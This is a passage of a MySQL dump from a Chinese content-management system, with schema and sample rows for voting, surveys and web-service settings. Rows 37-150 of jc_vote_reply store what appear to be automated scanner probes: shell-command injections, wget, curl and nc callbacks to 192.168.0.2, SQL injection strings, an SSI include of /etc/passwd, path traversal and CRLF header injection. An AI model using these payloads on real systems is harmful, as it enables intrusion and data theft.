INSERT INTO `jc_vote_record` VALUES ('47', null, '10', '2016-10-10 16:01:00', '117.41.152.66', 'be507e426c2e4fdcb4e4dbcac6f925aa', null);
INSERT INTO `jc_vote_record` VALUES ('48', null, '10', '2016-10-10 16:01:00', '117.41.152.66', 'a32b9c09af56456d8eadbc91c0e36632', null);
INSERT INTO `jc_vote_record` VALUES ('50', null, '10', '2016-10-10 16:01:01', '117.41.152.66', 'd5c2cc42603c41e3968576b736118b62', null);
INSERT INTO `jc_vote_record` VALUES ('51', null, '10', '2016-10-10 16:01:01', '117.41.152.66', 'fd79161c7c22486981d3ba0bcceb1500', null);
INSERT INTO `jc_vote_record` VALUES ('53', null, '10', '2016-10-10 16:01:01', '117.41.152.66', '9281df23008c40708f0a8e43341ac4ae', null);
INSERT INTO `jc_vote_record` VALUES ('54', null, '10', '2016-10-10 16:01:02', '117.41.152.66', '857782badf554f7fb1a3cd42ff1be708', null);
INSERT INTO `jc_vote_record` VALUES ('55', null, '10', '2016-10-10 16:01:02', '117.41.152.66', '6dfc50c459a34d669aed64847f7c6733', null);
INSERT INTO `jc_vote_record` VALUES ('56', null, '10', '2016-10-10 16:01:06', '117.41.152.66', '7163edffccd8453888abce6f95d7cfdd', null);
INSERT INTO `jc_vote_record` VALUES ('57', null, '10', '2016-10-10 16:01:06', '117.41.152.66', '472e57a5836f42d09c3afbb23552e4e3', null);
INSERT INTO `jc_vote_record` VALUES ('58', null, '10', '2016-10-10 16:01:07', '117.41.152.66', '17ebcb43eaba48f087c700d367b41692', null);
INSERT INTO `jc_vote_record` VALUES ('59', null, '10', '2016-10-10 16:01:07', '117.41.152.66', '727bdde2e94d4077b081959f4ca9a946', null);
INSERT INTO `jc_vote_record` VALUES ('60', null, '10', '2016-10-10 16:01:07', '117.41.152.66', '16d626ece9bd41aeb1300be3b9ea3ee0', null);
INSERT INTO `jc_vote_record` VALUES ('61', null, '10', '2016-10-10 16:01:08', '117.41.152.66', '8993e9dd5af34d3faf8dbcbf5c6494d6', null);
INSERT INTO `jc_vote_record` VALUES ('62', null, '10', '2016-10-10 16:01:08', '117.41.152.66', 'bfda82a4d10f4d1b8d4e32e55200d07e', null);
INSERT INTO `jc_vote_record` VALUES ('63', null, '10', '2016-10-10 16:01:09', '117.41.152.66', '76ecfcc002b54d568a5f0d4f1ca20700', null);
INSERT INTO `jc_vote_record` VALUES ('64', null, '10', '2016-10-10 16:01:09', '117.41.152.66', '1ff84eab46d442daae3673ad2e831a54', null);
INSERT INTO `jc_vote_record` VALUES ('65', null, '10', '2016-10-10 16:01:10', '117.41.152.66', '0f39c2a605bf49c0a376879cd557ce01', null);
INSERT INTO `jc_vote_record` VALUES ('66', null, '10', '2016-10-10 16:01:10', '117.41.152.66', 'cb44988a08b34af1bff99c1cb63b8b2d', null);
INSERT INTO `jc_vote_record` VALUES ('67', null, '10', '2016-10-10 16:01:11', '117.41.152.66', '4ba0635f7de14fe1b3a10de57d5783d4', null);
INSERT INTO `jc_vote_record` VALUES ('68', null, '10', '2016-10-10 16:01:11', '117.41.152.66', '0711f2524cf4451d954c6f94c4bf5099', null);
INSERT INTO `jc_vote_record` VALUES ('69', null, '10', '2016-10-10 16:01:12', '117.41.152.66', '5865796b06ee43af8f727c8f8f57ff94', null);
INSERT INTO `jc_vote_record` VALUES ('70', null, '10', '2016-10-10 16:01:12', '117.41.152.66', 'ba8fa930a89d499ab4fbe4e0d565be10', null);
INSERT INTO `jc_vote_record` VALUES ('71', null, '10', '2016-10-10 16:01:13', '117.41.152.66', 'e68f2e1dc3f94724bdc91b29bd3846bc', null);
INSERT INTO `jc_vote_record` VALUES ('72', null, '10', '2016-10-10 16:01:13', '117.41.152.66', 'e574898d0d3f4313b2dd7e607e432d44', null);
INSERT INTO `jc_vote_record` VALUES ('73', null, '10', '2016-10-10 16:01:14', '117.41.152.66', '8c6f9de0ee764264bf0c3b105ccf4825', null);
INSERT INTO `jc_vote_record` VALUES ('74', null, '10', '2016-10-10 16:01:14', '117.41.152.66', 'd73fc39a867d46459c5bb5d5b353933f', null);
INSERT INTO `jc_vote_record` VALUES ('75', null, '10', '2016-10-10 16:01:15', '117.41.152.66', '00fd7c694c2f4d18951b9feda39fec5d', null);
INSERT INTO `jc_vote_record` VALUES ('76', null, '11', '2016-10-10 16:01:39', '117.41.152.66', '869e55ac9e1548c7b95956d1083e7a83', null);
INSERT INTO `jc_vote_record` VALUES ('77', null, '10', '2016-10-10 16:01:40', '117.41.152.66', '5c9efcf72f784ec2948c34c660e11d26', null);
INSERT INTO `jc_vote_record` VALUES ('78', null, '11', '2016-10-10 16:01:41', '117.41.152.66', '222ebfd7010f4c69b971bbb388d2e3d0', null);
INSERT INTO `jc_vote_record` VALUES ('79', null, '11', '2016-10-10 16:01:42', '117.41.152.66', '0a9d43bc940f4b0786e981aa09ac3a67', null);
INSERT INTO `jc_vote_record` VALUES ('80', null, '10', '2016-10-10 16:01:43', '117.41.152.66', '160ba1860a52472bbfa17230f5cd1d99', null);

-- ----------------------------
-- Table structure for jc_vote_reply
-- ----------------------------
DROP TABLE IF EXISTS `jc_vote_reply`;
CREATE TABLE `jc_vote_reply` (
  `votereply_id` int(11) NOT NULL AUTO_INCREMENT,
  `reply` text COMMENT '回复内容',
  `subtopic_id` int(11) DEFAULT NULL,
  PRIMARY KEY (`votereply_id`),
  KEY `FK_jc_vote_reply_sub` (`subtopic_id`),
  CONSTRAINT `FK_jc_vote_reply_sub` FOREIGN KEY (`subtopic_id`) REFERENCES `jc_vote_subtopic` (`subtopic_id`)
) ENGINE=InnoDB AUTO_INCREMENT=151 DEFAULT CHARSET=utf8 COMMENT='投票文本题目回复表';

-- ----------------------------
-- Records of jc_vote_reply
-- ----------------------------
INSERT INTO `jc_vote_reply` VALUES ('1', '111', '14');
INSERT INTO `jc_vote_reply` VALUES ('2', '111', '14');
INSERT INTO `jc_vote_reply` VALUES ('3', '111', '14');
INSERT INTO `jc_vote_reply` VALUES ('4', '111', '14');
INSERT INTO `jc_vote_reply` VALUES ('5', '111', '14');
INSERT INTO `jc_vote_reply` VALUES ('6', '111', '14');
INSERT INTO `jc_vote_reply` VALUES ('7', '111', '14');
INSERT INTO `jc_vote_reply` VALUES ('8', '111', '14');
INSERT INTO `jc_vote_reply` VALUES ('9', '1234', '14');
INSERT INTO `jc_vote_reply` VALUES ('10', '1234', '14');
INSERT INTO `jc_vote_reply` VALUES ('11', '1234', '14');
INSERT INTO `jc_vote_reply` VALUES ('12', '1234', '14');
INSERT INTO `jc_vote_reply` VALUES ('13', '1234', '14');
INSERT INTO `jc_vote_reply` VALUES ('14', '1234', '14');
INSERT INTO `jc_vote_reply` VALUES ('15', '1234', '14');
INSERT INTO `jc_vote_reply` VALUES ('16', '1234', '14');
INSERT INTO `jc_vote_reply` VALUES ('17', '1234', '14');
INSERT INTO `jc_vote_reply` VALUES ('18', '1234', '14');
INSERT INTO `jc_vote_reply` VALUES ('19', '1234', '14');
INSERT INTO `jc_vote_reply` VALUES ('20', '1234', '14');
INSERT INTO `jc_vote_reply` VALUES ('21', '1234', '14');
INSERT INTO `jc_vote_reply` VALUES ('22', '1234', '14');
INSERT INTO `jc_vote_reply` VALUES ('23', '1234', '14');
INSERT INTO `jc_vote_reply` VALUES ('24', '1234', '14');
INSERT INTO `jc_vote_reply` VALUES ('25', '1234', '14');
INSERT INTO `jc_vote_reply` VALUES ('26', '1234', '14');
INSERT INTO `jc_vote_reply` VALUES ('27', '1234', '14');
INSERT INTO `jc_vote_reply` VALUES ('28', '1234', '14');
INSERT INTO `jc_vote_reply` VALUES ('29', '1234', '14');
INSERT INTO `jc_vote_reply` VALUES ('30', '1234', '14');
INSERT INTO `jc_vote_reply` VALUES ('31', '1234', '14');
INSERT INTO `jc_vote_reply` VALUES ('32', '1234', '14');
INSERT INTO `jc_vote_reply` VALUES ('33', '1234', '14');
INSERT INTO `jc_vote_reply` VALUES ('34', '1234', '14');
INSERT INTO `jc_vote_reply` VALUES ('35', '1234', '14');
INSERT INTO `jc_vote_reply` VALUES ('36', '1234', '14');
INSERT INTO `jc_vote_reply` VALUES ('37', '1234WFXSSProbe', '14');
INSERT INTO `jc_vote_reply` VALUES ('38', 'WF&＃39;SQL\"Probe;A--B', '14');
INSERT INTO `jc_vote_reply` VALUES ('39', '1234&＃39;\"', '14');
INSERT INTO `jc_vote_reply` VALUES ('40', 'ProbePhishing', '14');
INSERT INTO `jc_vote_reply` VALUES ('41', 'A1234B', '14');
INSERT INTO `jc_vote_reply` VALUES ('42', '1234WFXSSProbe&＃39;\"&＃41;/&gt;', '14');
INSERT INTO `jc_vote_reply` VALUES ('43', '1234', '14');
INSERT INTO `jc_vote_reply` VALUES ('44', '1234', '14');
INSERT INTO `jc_vote_reply` VALUES ('45', '99999999999999999999', '14');
INSERT INTO `jc_vote_reply` VALUES ('46', '1234＃&&lt;&＃40;, \"&gt;;', '14');
INSERT INTO `jc_vote_reply` VALUES ('47', '1234', '14');
INSERT INTO `jc_vote_reply` VALUES ('48', '-99999999999999999999', '14');
INSERT INTO `jc_vote_reply` VALUES ('49', '|id', '14');
INSERT INTO `jc_vote_reply` VALUES ('50', '|ls -a1F', '14');
INSERT INTO `jc_vote_reply` VALUES ('51', '1234', '14');
INSERT INTO `jc_vote_reply` VALUES ('52', '1234', '14');
INSERT INTO `jc_vote_reply` VALUES ('53', '&&id', '14');
INSERT INTO `jc_vote_reply` VALUES ('54', '4294967297', '14');
INSERT INTO `jc_vote_reply` VALUES ('55', 'ls', '14');
INSERT INTO `jc_vote_reply` VALUES ('56', '&&ls -a1F', '14');
INSERT INTO `jc_vote_reply` VALUES ('57', '18446744073709551617', '14');
INSERT INTO `jc_vote_reply` VALUES ('58', '1234', '14');
INSERT INTO `jc_vote_reply` VALUES ('59', '||id', '14');
INSERT INTO `jc_vote_reply` VALUES ('60', '||ls -a1F', '14');
INSERT INTO `jc_vote_reply` VALUES ('61', '\0', '14');
INSERT INTO `jc_vote_reply` VALUES ('62', '&＃39; | &＃39;id', '14');
INSERT INTO `jc_vote_reply` VALUES ('63', '&＃39; | &＃39;ls -a1F', '14');
INSERT INTO `jc_vote_reply` VALUES ('64', '1234', '14');
INSERT INTO `jc_vote_reply` VALUES ('65', '\" | \"id', '14');
INSERT INTO `jc_vote_reply` VALUES ('66', '|vol', '14');
INSERT INTO `jc_vote_reply` VALUES ('67', '1234', '14');
INSERT INTO `jc_vote_reply` VALUES ('68', '\" | \"ls -a1F', '14');
INSERT INTO `jc_vote_reply` VALUES ('69', '1234', '14');
INSERT INTO `jc_vote_reply` VALUES ('70', 'id', '14');
INSERT INTO `jc_vote_reply` VALUES ('71', '&&vol', '14');
INSERT INTO `jc_vote_reply` VALUES ('72', '1234', '14');
INSERT INTO `jc_vote_reply` VALUES ('73', 'id|', '14');
INSERT INTO `jc_vote_reply` VALUES ('74', 'ls -a1F', '14');
INSERT INTO `jc_vote_reply` VALUES ('75', ';id\0', '14');
INSERT INTO `jc_vote_reply` VALUES ('76', '1234\"|wget http://192.168.0.2:51167/AppScanMsg.html?varId=1269|echo \"', '14');
INSERT INTO `jc_vote_reply` VALUES ('77', '||vol', '14');
INSERT INTO `jc_vote_reply` VALUES ('78', '1234', '14');
INSERT INTO `jc_vote_reply` VALUES ('79', '../../../../../../../../../../../../bin/id|', '14');
INSERT INTO `jc_vote_reply` VALUES ('80', ';ls -a1F\0', '14');
INSERT INTO `jc_vote_reply` VALUES ('81', '1234', '14');
INSERT INTO `jc_vote_reply` VALUES ('82', '&＃39; | &＃39;vol', '14');
INSERT INTO `jc_vote_reply` VALUES ('83', '1234&＃39;|wget http://192.168.0.2:51167/AppScanMsg.html?varId=1275|echo &＃39;', '14');
INSERT INTO `jc_vote_reply` VALUES ('84', '../../../../../../../../../../../../usr/bin/id|', '14');
INSERT INTO `jc_vote_reply` VALUES ('85', '0 0 0 1234', '14');
INSERT INTO `jc_vote_reply` VALUES ('86', '1234', '14');
INSERT INTO `jc_vote_reply` VALUES ('87', '\" | \"vol', '14');
INSERT INTO `jc_vote_reply` VALUES ('88', '1234|wget http://192.168.0.2:51167/AppScanMsg.html?varId=1276|echo ;', '14');
INSERT INTO `jc_vote_reply` VALUES ('89', '1234&＃39; and &＃39;f&＃39;=&＃39;f', '14');
INSERT INTO `jc_vote_reply` VALUES ('90', ';vol\0', '14');
INSERT INTO `jc_vote_reply` VALUES ('91', '1234&＃39; and &＃39;f&＃39;=&＃39;f&＃39; -- ', '14');
INSERT INTO `jc_vote_reply` VALUES ('92', '1234&＃39; and &＃39;f&＃39;=&＃39;f&＃39;&＃41; -- ', '14');
INSERT INTO `jc_vote_reply` VALUES ('93', '1234&＃39; and &＃39;b&＃39;=&＃39;f', '14');
INSERT INTO `jc_vote_reply` VALUES ('94', '1234\"|echo -e \"GET /AppScanMsg.html?varId=1280 HTTP/1.0\\r\\n\\r\\n\" | nc 192.168.0.2 51167|echo \"', '14');
INSERT INTO `jc_vote_reply` VALUES ('95', '1234&＃39; and &＃39;b&＃39;=&＃39;f&＃39; -- ', '14');
INSERT INTO `jc_vote_reply` VALUES ('96', '1234&＃39; and &＃39;b&＃39;=&＃39;f&＃39;&＃41; --', '14');
INSERT INTO `jc_vote_reply` VALUES ('97', '1234&＃39; or &＃39;f&＃39;=&＃39;f', '14');
INSERT INTO `jc_vote_reply` VALUES ('98', '1234&＃39; or &＃39;f&＃39;=&＃39;f&＃39; -- ', '14');
INSERT INTO `jc_vote_reply` VALUES ('99', '1234&＃39;|echo -e \"GET /AppScanMsg.html?varId=1288 HTTP/1.0\\r\\n\\r\\n\" | nc 192.168.0.2 51167|echo &＃39;', '14');
INSERT INTO `jc_vote_reply` VALUES ('100', '1234&＃39; or &＃39;f&＃39;=&＃39;f&＃39;&＃41; --', '14');
INSERT INTO `jc_vote_reply` VALUES ('101', '&lt;!--＃include file=\"/etc/passwd\"--&gt;', '14');
INSERT INTO `jc_vote_reply` VALUES ('102', '1234', '14');
INSERT INTO `jc_vote_reply` VALUES ('103', '&lt;!--＃include file=\"C:\\boot.ini\"--&gt;', '14');
INSERT INTO `jc_vote_reply` VALUES ('104', '1234|echo -e \"GET /AppScanMsg.html?varId=1289 HTTP/1.0\\r\\n\\r\\n\" | nc 192.168.0.2 51167|echo ', '14');
INSERT INTO `jc_vote_reply` VALUES ('105', '1234', '14');
INSERT INTO `jc_vote_reply` VALUES ('106', '1234 and 7659=7659', '14');
INSERT INTO `jc_vote_reply` VALUES ('107', ';vol|', '14');
INSERT INTO `jc_vote_reply` VALUES ('108', '1234', '14');
INSERT INTO `jc_vote_reply` VALUES ('109', '1234;curl http://192.168.0.2:51167/AppScanMsg.html?varId=1290;', '14');
INSERT INTO `jc_vote_reply` VALUES ('110', '1234 and 0=7659', '14');
INSERT INTO `jc_vote_reply` VALUES ('111', '1234/**/and/**/7659=7659', '14');
INSERT INTO `jc_vote_reply` VALUES ('112', '&＃39;   ltrim&＃40;&＃39;&＃39;&＃41;   &＃39;1234', '14');
INSERT INTO `jc_vote_reply` VALUES ('113', '1234', '14');
INSERT INTO `jc_vote_reply` VALUES ('114', '1234 or 7659=7659', '14');
INSERT INTO `jc_vote_reply` VALUES ('115', '&＃39;   &＃39;   &＃39;1234', '14');
INSERT INTO `jc_vote_reply` VALUES ('116', '1234/**/and/**/0=7659', '14');
INSERT INTO `jc_vote_reply` VALUES ('117', '12345 12345 1234', '14');
INSERT INTO `jc_vote_reply` VALUES ('118', '1234', '14');
INSERT INTO `jc_vote_reply` VALUES ('119', '1234', '14');
INSERT INTO `jc_vote_reply` VALUES ('120', '1234&＃39;   &＃39;   &＃39;', '14');
INSERT INTO `jc_vote_reply` VALUES ('121', '1234/**/or/**/7659=7659', '14');
INSERT INTO `jc_vote_reply` VALUES ('122', '1234 and 7659=7659', '14');
INSERT INTO `jc_vote_reply` VALUES ('123', '12345-1234-1234', '14');
INSERT INTO `jc_vote_reply` VALUES ('124', '1234', '14');
INSERT INTO `jc_vote_reply` VALUES ('125', '&＃40;select 1234&＃41;', '14');
INSERT INTO `jc_vote_reply` VALUES ('126', '1234', '14');
INSERT INTO `jc_vote_reply` VALUES ('127', '&＃39; || &＃39;&＃39; || &＃39;1234', '14');
INSERT INTO `jc_vote_reply` VALUES ('128', '1234 and abc=7659', '14');
INSERT INTO `jc_vote_reply` VALUES ('129', '&＃40;select 1234,1234&＃41;', '14');
INSERT INTO `jc_vote_reply` VALUES ('130', '&＃39; || &＃39; || &＃39;1234', '14');
INSERT INTO `jc_vote_reply` VALUES ('131', '&＃39;', '14');
INSERT INTO `jc_vote_reply` VALUES ('132', '1234 or', '14');
INSERT INTO `jc_vote_reply` VALUES ('133', '1234&＃39; || &＃39; || &＃39;', '14');
INSERT INTO `jc_vote_reply` VALUES ('134', '&＃40;select 1234,', '14');
INSERT INTO `jc_vote_reply` VALUES ('135', 'AVAK$&＃40;RETURN_CODE&＃41;OS', '14');
INSERT INTO `jc_vote_reply` VALUES ('136', '\\&＃39;', '14');
INSERT INTO `jc_vote_reply` VALUES ('137', ';', '14');
INSERT INTO `jc_vote_reply` VALUES ('138', '1234', '14');
INSERT INTO `jc_vote_reply` VALUES ('139', '\"', '14');
INSERT INTO `jc_vote_reply` VALUES ('140', '1234', '14');
INSERT INTO `jc_vote_reply` VALUES ('141', '1234XYZ', '14');
INSERT INTO `jc_vote_reply` VALUES ('142', '\\\"', '14');
INSERT INTO `jc_vote_reply` VALUES ('143', '1234kqprobebg000043', '14');
INSERT INTO `jc_vote_reply` VALUES ('144', '1234\rAppScanHeader: AppScanValue/1.2-1350\rSecondAppScanHeader: whatever', '14');
INSERT INTO `jc_vote_reply` VALUES ('145', '&＃41;', '14');
INSERT INTO `jc_vote_reply` VALUES ('146', 'kqprobebg000043', '14');
INSERT INTO `jc_vote_reply` VALUES ('147', '1234\r\nAppScanHeader: AppScanValue/1.2-1355\r\nSecondAppScanHeader: whatever', '14');
INSERT INTO `jc_vote_reply` VALUES ('148', '\"&＃39;', '14');
INSERT INTO `jc_vote_reply` VALUES ('149', '1234&＃39;Akqprobebg000043', '14');
INSERT INTO `jc_vote_reply` VALUES ('150', '1234\"Akqprobebg000043', '14');

-- ----------------------------
-- Table structure for jc_vote_subtopic
-- ----------------------------
DROP TABLE IF EXISTS `jc_vote_subtopic`;
CREATE TABLE `jc_vote_subtopic` (
  `subtopic_id` int(11) NOT NULL AUTO_INCREMENT,
  `title` varchar(255) NOT NULL DEFAULT '' COMMENT '标题',
  `votetopic_id` int(11) NOT NULL DEFAULT '0' COMMENT '投票（调查）',
  `subtopic_type` int(2) NOT NULL DEFAULT '1' COMMENT '类型（1单选，2多选，3文本）',
  `priority` int(11) DEFAULT NULL,
  PRIMARY KEY (`subtopic_id`),
  KEY `FK_jc_vote_subtopic_vote` (`votetopic_id`),
  CONSTRAINT `FK_jc_vote_subtopic_vote` FOREIGN KEY (`votetopic_id`) REFERENCES `jc_vote_topic` (`votetopic_id`)
) ENGINE=InnoDB AUTO_INCREMENT=28 DEFAULT CHARSET=utf8 COMMENT='投票子题目';

-- ----------------------------
-- Records of jc_vote_subtopic
-- ----------------------------
INSERT INTO `jc_vote_subtopic` VALUES ('13', 'V8版本演示站网页的设计风格您喜欢吗？', '2', '1', '1');
INSERT INTO `jc_vote_subtopic` VALUES ('14', '我觉得这里完善一下：', '2', '3', '3');
INSERT INTO `jc_vote_subtopic` VALUES ('15', 'V8版本比V7版的设计风格有改进吗？', '2', '1', '2');
INSERT INTO `jc_vote_subtopic` VALUES ('16', '您觉得V8演示站哪些模块做的比较好', '2', '2', '4');
INSERT INTO `jc_vote_subtopic` VALUES ('18', '上海工资收入', '3', '1', '1');
INSERT INTO `jc_vote_subtopic` VALUES ('20', '你喜欢哪个', '4', '1', '1');
INSERT INTO `jc_vote_subtopic` VALUES ('21', '你支持哪个选手？', '5', '1', '1');
INSERT INTO `jc_vote_subtopic` VALUES ('22', '你支持哪个选手？', '6', '1', '1');
INSERT INTO `jc_vote_subtopic` VALUES ('23', '你支持哪个选手？', '7', '1', '1');
INSERT INTO `jc_vote_subtopic` VALUES ('24', '你支持哪个选手？', '8', '1', '1');
INSERT INTO `jc_vote_subtopic` VALUES ('25', '你支持哪个学校？', '9', '1', '1');
INSERT INTO `jc_vote_subtopic` VALUES ('26', '国庆长假结束,您尽兴了吗?', '10', '1', '1');
INSERT INTO `jc_vote_subtopic` VALUES ('27', '你对取消住房公积金怎么看？', '11', '1', '1');

-- ----------------------------
-- Table structure for jc_vote_topic
-- ----------------------------
DROP TABLE IF EXISTS `jc_vote_topic`;
CREATE TABLE `jc_vote_topic` (
  `votetopic_id` int(11) NOT NULL AUTO_INCREMENT,
  `site_id` int(11) NOT NULL,
  `title` varchar(255) NOT NULL COMMENT '标题',
  `description` varchar(255) DEFAULT NULL COMMENT '描述',
  `start_time` datetime DEFAULT NULL COMMENT '开始时间',
  `end_time` datetime DEFAULT NULL COMMENT '结束时间',
  `repeate_hour` int(11) DEFAULT NULL COMMENT '重复投票限制时间，单位小时，为空不允许重复投票',
  `total_count` int(11) NOT NULL DEFAULT '0' COMMENT '总投票数',
  `multi_select` int(11) NOT NULL DEFAULT '1' COMMENT '最多可以选择几项',
  `is_restrict_member` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否限制会员',
  `is_restrict_ip` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否限制IP',
  `is_restrict_cookie` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否限制COOKIE',
  `is_disabled` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否禁用',
  `is_def` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否默认主题',
  `limit_weixin` tinyint(1) DEFAULT '0' COMMENT '是否限制微信',
  `vote_day` int(11) DEFAULT '0' COMMENT '限定微信投票每个用户每日投票次数,为0时则投票期内限定投票一次',
  PRIMARY KEY (`votetopic_id`),
  KEY `fk_jc_votetopic_site` (`site_id`),
  CONSTRAINT `fk_jc_votetopic_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`)
) ENGINE=InnoDB AUTO_INCREMENT=12 DEFAULT CHARSET=utf8 COMMENT='CMS投票主题';

-- ----------------------------
-- Records of jc_vote_topic
-- ----------------------------
INSERT INTO `jc_vote_topic` VALUES ('2', '1', 'caihongyixue演示站改版用户问卷调查', 'caihongyixuev8版正式发布了，伴随着系统的完善，caihongyixue演示站的模板也一直在不断的改版，针对此次改版，caihongyixue美工团队特邀您参与“caihongyixue演示站改版用户问卷调查”，希望大家能提出宝贵的意见，我们一定认真改进，谢谢大家的支持！', null, null, null, '84', '1', '0', '0', '0', '0', '1', '0', '0');
INSERT INTO `jc_vote_topic` VALUES ('3', '1', '工资收入问卷调查', '工资收入问卷调查', '2016-09-30 14:51:49', '2016-09-30 15:00:49', null, '1', '1', '0', '0', '1', '0', '0', '0', '0');
INSERT INTO `jc_vote_topic` VALUES ('4', '1', '男神女神主持选拔大赛', '男神女神主持选拔大赛开始了，美女帅哥云集，大家快来投票吧！', null, '2020-10-09 10:30:13', null, '0', '1', '0', '0', '1', '0', '0', '0', '0');
INSERT INTO `jc_vote_topic` VALUES ('5', '1', '最美志愿者评选', '', null, '2019-01-09 10:33:59', null, '0', '1', '0', '0', '1', '0', '0', '0', '0');
INSERT INTO `jc_vote_topic` VALUES ('6', '1', '2015年度好声音评选', '', null, '2016-12-31 10:35:16', null, '0', '1', '0', '0', '1', '0', '0', '0', '0');
INSERT INTO `jc_vote_topic` VALUES ('7', '1', '“樱花女神”评选大赛 第一季', '', null, '2017-10-18 10:36:42', null, '0', '1', '0', '0', '1', '0', '0', '0', '0');
INSERT INTO `jc_vote_topic` VALUES ('8', '1', '微信拍照大奖赛优秀作品 投票 开始啦', '', null, '2016-10-27 10:37:50', null, '0', '1', '0', '0', '1', '0', '0', '0', '0');
INSERT INTO `jc_vote_topic` VALUES ('9', '1', '南昌“我的校园我的家 温馨校园”评选活动', '', null, '2017-12-01 10:38:52', null, '0', '1', '0', '0', '1', '0', '0', '0', '0');
INSERT INTO `jc_vote_topic` VALUES ('10', '1', '国庆长假结束,您尽兴了吗?', '', null, '2017-10-10 10:40:41', null, '37', '1', '0', '0', '1', '0', '0', '0', '0');
INSERT INTO `jc_vote_topic` VALUES ('11', '1', '专家建议取消住房公积金，这事儿你咋看？', '', null, '2018-10-18 10:42:29', null, '16', '1', '0', '0', '1', '0', '0', '0', '0');

-- ----------------------------
-- Table structure for jc_webservice
-- ----------------------------
DROP TABLE IF EXISTS `jc_webservice`;
CREATE TABLE `jc_webservice` (
  `service_id` int(11) NOT NULL AUTO_INCREMENT,
  `service_address` varchar(255) NOT NULL DEFAULT '' COMMENT '接口地址',
  `target_namespace` varchar(255) DEFAULT NULL,
  `success_result` varchar(255) DEFAULT '' COMMENT '正确返回值',
  `service_type` varchar(50) DEFAULT NULL COMMENT '接口类型',
  `service_operate` varchar(50) DEFAULT NULL COMMENT '接口操作',
  PRIMARY KEY (`service_id`)
) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=utf8 COMMENT='接口表';

-- ----------------------------
-- Records of jc_webservice
-- ----------------------------
INSERT INTO `jc_webservice` VALUES ('1', 'http://localhost:2020/services/User?wsdl', 'http://localhost:2020/services/User', '100', 'addUser', 'addUser');
INSERT INTO `jc_webservice` VALUES ('2', 'http://localhost:2020/services/User?wsdl', 'http://localhost:2020/services/User', '100', 'updateUser', 'updateUser');
INSERT INTO `jc_webservice` VALUES ('3', 'http://localhost:2020/services/User?wsdl', 'http://localhost:2020/services/User', '100', 'deleteUser', 'delUser');

-- ----------------------------
-- Table structure for jc_webservice_auth
-- ----------------------------
DROP TABLE IF EXISTS `jc_webservice_auth`;
CREATE TABLE `jc_webservice_auth` (
  `auth_id` int(11) NOT NULL AUTO_INCREMENT,
  `username` varchar(50) NOT NULL COMMENT '用户名',
  `password` varchar(50) NOT NULL COMMENT '密码',
  `system` varchar(100) NOT NULL COMMENT '系统',
  `is_enable` tinyint(1) NOT NULL DEFAULT '1' COMMENT '是否启用',
  PRIMARY KEY (`auth_id`)
) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=utf8 COMMENT='webservices认证表';

-- ----------------------------
-- Records of jc_webservice_auth
-- ----------------------------
INSERT INTO `jc_webservice_auth` VALUES ('1', 'test', '098f6bcd4621d373cade4e832627b4f6', 'bbs', '1');

-- ----------------------------
-- Table structure for jc_webservice_call_record
-- ----------------------------
DROP TABLE IF EXISTS `jc_webservice_call_record`;
CREATE TABLE `jc_webservice_call_record` (
  `record_id` int(11) NOT NULL AUTO_INCREMENT,
  `service_code` varchar(50) NOT NULL COMMENT '接口识别码',
  `auth_id` int(11) NOT NULL COMMENT '调用的认证',
  `record_time` datetime NOT NULL COMMENT '调用时间',
  PRIMARY KEY (`record_id`),
  KEY `fk_webservice_record_auth` (`auth_id`),
  CONSTRAINT `fk_webservice_record_auth` FOREIGN KEY (`auth_id`) REFERENCES `jc_webservice_auth` (`auth_id`)
) ENGINE=InnoDB AUTO_INCREMENT=9 DEFAULT CHARSET=utf8 COMMENT='接口调用记录';

-- ----------------------------
-- Records of jc_webservice_call_record
-- ----------------------------
INSERT INTO `jc_webservice_call_record` VALUES ('1', 'user_update', '1', '2017-01-17 16:00:39');
INSERT INTO `jc_webservice_call_record` VALUES ('2', 'user_update', '1', '2017-01-17 16:09:23');
INSERT INTO `jc_webservice_call_record` VALUES ('3', 'user_update', '1', '2017-01-17 16:11:59');
INSERT INTO `jc_webservice_call_record` VALUES ('4', 'user_update', '1', '2017-01-17 16:13:57');
INSERT INTO `jc_webservice_call_record` VALUES ('5', 'user_add', '1', '2017-01-17 23:38:42');
INSERT INTO `jc_webservice_call_record` VALUES ('6', 'user_update', '1', '2017-01-17 23:38:54');
INSERT INTO `jc_webservice_call_record` VALUES ('7', 'user_delete', '1', '2017-01-17 23:39:48');
INSERT INTO `jc_webservice_call_record` VALUES ('8', 'user_update', '1', '2017-01-18 17:27:24');

-- ----------------------------
-- Table structure for jc_webservice_param
-- ----------------------------
DROP TABLE IF EXISTS `jc_webservice_param`;
CREATE TABLE `jc_webservice_param` (
  `service_id` int(11) NOT NULL DEFAULT '0',
  `priority` int(11) NOT NULL DEFAULT '0' COMMENT '排列顺序',
  `param_name` varchar(100) NOT NULL DEFAULT '' COMMENT '参数名',
  `default_value` varchar(255) DEFAULT NULL COMMENT '默认值',
  KEY `fk_param_webservice` (`service_id`),
  CONSTRAINT `fk_param_webservice` FOREIGN KEY (`service_id`) REFERENCES `jc_webservice` (`service_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='接口参数表';

-- ----------------------------
-- Records of jc_webservice_param
-- ----------------------------
INSERT INTO `jc_webservice_param` VALUES ('1', '0', 'auth_username', 'test');
INSERT INTO `jc_webservice_param` VALUES ('1', '1', 'auth_password', 'test');
INSERT INTO `jc_webservice_param` VALUES ('1', '2', 'username', '');
INSERT INTO `jc_webservice_param` VALUES ('1', '3', 'password', '');
INSERT INTO `jc_webservice_param` VALUES ('1', '4', 'email', '');
INSERT INTO `jc_webservice_param` VALUES ('1', '5', 'realname', '');
INSERT INTO `jc_webservice_param` VALUES ('1', '6', 'sex', '');
INSERT INTO `jc_webservice_param` VALUES ('1', '7', 'tel', '');
INSERT INTO `jc_webservice_param` VALUES ('2', '0', 'auth_username', 'test');
INSERT INTO `jc_webservice_param` VALUES ('2', '1', 'auth_password', 'test');
INSERT INTO `jc_webservice_param` VALUES ('2', '2', 'username', '');
INSERT INTO `jc_webservice_param` VALUES ('2', '3', 'password', '');
INSERT INTO `jc_webservice_param` VALUES ('2', '4', 'email', '');
